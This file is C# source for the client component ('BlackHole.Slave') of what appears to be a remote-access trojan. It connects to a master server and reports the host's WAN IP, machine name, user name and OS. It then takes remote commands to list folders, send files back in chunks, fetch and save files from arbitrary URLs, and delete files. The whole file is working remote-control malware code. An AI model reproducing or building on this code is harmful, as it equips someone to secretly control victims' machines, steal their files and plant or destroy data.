﻿using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using NetMQ;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class MasterServer
    {
        public const int DISCONNECTION_TIMEOUT = 5000;
        public const int SEND_INTERVAL = 10;
        public const int RECEIVE_INTERVAL = 10;

        private Stopwatch m_receiveTimer;
        private NetMQContext m_netContext;
        private NetMQSocket m_client;
        private Poller m_poller;
        private ConcurrentQueue<NetMQMessage> m_sendQueue = new ConcurrentQueue<NetMQMessage>();
        private string m_serverAddress;
        private bool m_connected = false;
        private long m_lastReceived = -1;

        /// <summary>
        /// 
        /// </summary>
        public MasterServer(NetMQContext context, string serverAddress)
        {
            m_serverAddress = serverAddress;
            m_netContext = context;
            m_client = m_netContext.CreateDealerSocket();
            m_client.Options.Linger = TimeSpan.Zero;
            m_client.ReceiveReady += ClientReceive;

            m_receiveTimer = Stopwatch.StartNew();

            var sendTimer = new NetMQTimer(SEND_INTERVAL);
            sendTimer.Elapsed += SendQueue;

            m_poller = new Poller();
            m_poller.PollTimeout = 10;
            m_poller.AddTimer(sendTimer);
            m_poller.AddSocket(m_client);
            m_poller.PollTillCancelledNonBlocking();
            Connect();
        }

        /// <summary>
        /// 
        /// </summary>
        private void Connect()
        {
            m_client.Connect(m_serverAddress);
            Send(new GreetTheMasterMessage()
            {
                Ip = Utility.GetWanIp(),
                MachineName = Environment.MachineName,
                UserName = Environment.UserName,
                OperatingSystem = Environment.OSVersion.VersionString
            });
        }
    

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void SendQueue(object sender, NetMQTimerEventArgs e)
        {
            NetMQMessage message = null;
            var i = m_sendQueue.Count;
            while (i > 0)
            {
                if (m_sendQueue.TryDequeue(out message))
                    m_client.TrySendMultipartMessage(message);
                i--;
            }

            if(m_receiveTimer.ElapsedMilliseconds - m_lastReceived > DISCONNECTION_TIMEOUT && m_connected)
            {
                UpdateLastReceived();
                SetDisconnected();
                Connect();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private void SetConnected()
        {
            m_connected = true;
        }

        /// <summary>
        /// 
        /// </summary>
        private void SetDisconnected()
        {
            m_connected = false;
            ClearSendQueue();
        }

        /// <summary>
        /// 
        /// </summary>
        private void ClearSendQueue()
        {
            NetMQMessage msg = null;
            while (m_sendQueue.Count > 0)
                m_sendQueue.TryDequeue(out msg);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Send(NetMessage message) => m_sendQueue.Enqueue(new NetMQMessage(new byte[][] { message.Serialize() }));

        /// <summary>
        /// 
        /// </summary>
        private void UpdateLastReceived() => m_lastReceived = m_receiveTimer.ElapsedMilliseconds;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void ClientReceive(object sender, NetMQSocketEventArgs e)
        {
            UpdateLastReceived();
            SetConnected();

            var frames = m_client.ReceiveMultipartMessage();            
            var message = NetMessage.Deserialize(frames.Last.Buffer);
            message.Match()
                .With<DoYourDutyMessage>(DoYourDuty)
                .With<PingMessage>(Ping)
                .With<NavigateToFolderMessage>(NavigateToFolder)
                .With<DownloadFilePartMessage>(DownloadFilePart)
                .With<UploadFileMessage>(UploadFile)
                .With<DeleteFileMessage>(DeleteFile)
                .Default(m =>
                {

                });
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        private void SendStatus(long operationId, string operation, Exception exception) => SendStatus(operationId, operation, false, exception.ToString());

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="message"></param>
        private void SendStatus(long operationId, string operation, string message) => SendStatus(operationId, operation, true, message);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        /// <param name="message"></param>
        private void SendStatus(long operationId, string operation, bool success, string message)
        {
            Send(new StatusUpdateMessage()
            {
                OperationId = operationId,
                Operation = operation,
                Success = success,
                Message = message
            });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DoYourDuty(DoYourDutyMessage message)
        {
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void Ping(PingMessage message)
        {
            Send(new PongMessage());
        }
           
        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="messageBuilder"></param>
        private void ExecuteSimpleOperation<T>(string operationName, Func<T> operation, Func<T, string> messageBuilder) where T : NetMessage
            => ExecuteComplexSendOperation(-1, operationName, operation, (message) =>
            {
                SendStatus(-1, operationName, "Success : " + messageBuilder(message));
            });

        /// <summary>
        /// 
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="operationName"></param>
        /// <param name="operation"></param>
        /// <param name="success"></param>
        private void ExecuteComplexSendOperation<T>(long operationId, string operationName, Func<T> operation, Action<T> success) where T : NetMessage
            => Utility.ExecuteComplexOperation(operation, (message) =>
            {
                Send(message);
                success(message);
            }, (e) => SendStatus(operationId, operationName, e));


        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void NavigateToFolder(NavigateToFolderMessage message)
        {
            ExecuteSimpleOperation("Folder navigation", 
                () => FileHelper.NavigateToFolder(message.Path), 
                (nav) => nav.Path);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DownloadFilePart(DownloadFilePartMessage message)
        {
            ExecuteComplexSendOperation(message.Id, "File download",
                () => FileHelper.DownloadFilePart(message.Id, message.CurrentPart, message.Path),
                (part) =>
                {
                    if (part.CurrentPart == part.TotalPart)
                        SendStatus(message.Id, "File download", "Successfully downloaded : " + part.Path);
                });
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void UploadFile(UploadFileMessage message)
        {
            try
            {
                var client = new WebClient();
                client.DownloadProgressChanged += (s, e) =>
                {
                    // avoid spam by sending only 5 by 5%
                    if (e.ProgressPercentage % 5 == 0)
                    {
                        Send(new UploadProgressMessage()
                        {
                            Id = message.Id,
                            Path = message.Path,
                            Percentage = e.ProgressPercentage,
                            Uri = message.Uri
                        });
                    }
                };
                client.DownloadFileCompleted += (s, e) =>
                {
                    if (e.Error != null)
                    {
                        SendStatus(message.Id, "File upload (downloading from web)", e.Error);
                    }
                    else
                    {
                        // -1 mean finished
                        Send(new UploadProgressMessage()
                        {
                            Id = message.Id,
                            Path = message.Path,
                            Percentage = -1,
                            Uri = message.Uri
                        });
                    }
                    client.Dispose();
                };
                client.DownloadFileAsync(new Uri(message.Uri), message.Path);                
            }
            catch(Exception e)
            {
                SendStatus(message.Id, "File upload (downloading from web)", e);
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        private void DeleteFile(DeleteFileMessage message)
        {
            ExecuteSimpleOperation("File deletion",
                () => FileHelper.DeleteFile(message.FilePath),
                (nav) => nav.FilePath);
        }
    }
}
